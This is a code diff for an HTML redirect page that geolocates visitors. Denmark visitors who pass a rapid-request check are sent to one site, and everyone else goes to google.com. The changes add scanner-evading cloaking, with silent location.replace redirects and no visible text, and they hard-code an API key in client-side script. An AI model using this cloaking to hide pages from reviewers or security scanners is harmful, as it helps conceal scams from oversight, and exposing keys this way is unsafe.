@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect Page</title>
+    <title>Redirect</title>
     <script>
-        document.addEventListener("DOMContentLoaded", () => {
+        (function() {
             // Variables for bot detection
-            let requestCount = 0;
+            let requestTimestamps = [];
             const MAX_REQUESTS = 5; // Maximum requests allowed within 10 seconds
             const TIME_WINDOW = 10000; // 10 seconds
-
-            let requestTimestamps = [];
 
             // Function to check for multiple rapid requests (basic bot detection)
             function detectBot() {
@@ -24,29 +22,29 @@
             // Function to determine user's location and redirect
             async function handleRedirect() {
                 try {
-                    const response = await fetch("https://ipapi.co/json/"); // Fetch user location data
+                    const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=8811ea4ba96e4a40a79f001fd08658fa");
+                    if (!response.ok) {
+                        throw new Error("Failed to fetch location data");
+                    }
+
                     const data = await response.json();
                     const userCountry = data.country_name;
 
-                    if (userCountry === "Denmark") {
-                        window.location.href = "https://myoriginalsite.com";
-                    } else if (detectBot()) {
-                        window.location.href = "https://google.com";
+                    if (userCountry === "Denmark" && !detectBot()) {
+                        window.location.replace("https://myoriginalsite.com");
+                    } else {
+                        window.location.replace("https://google.com");
                     }
                 } catch (error) {
-                    console.error("Error fetching location data:", error);
-                    // Default fallback in case of an error
-                    window.location.href = "https://google.com";
+                    window.location.replace("https://google.com");
                 }
             }
 
-            // Increment request count and redirect
-            requestCount++;
+            // Immediate redirection logic
             handleRedirect();
-        });
+        })();
     </script>
 </head>
 <body>
-    <h1>Redirecting...</h1>
 </body>
 </html>
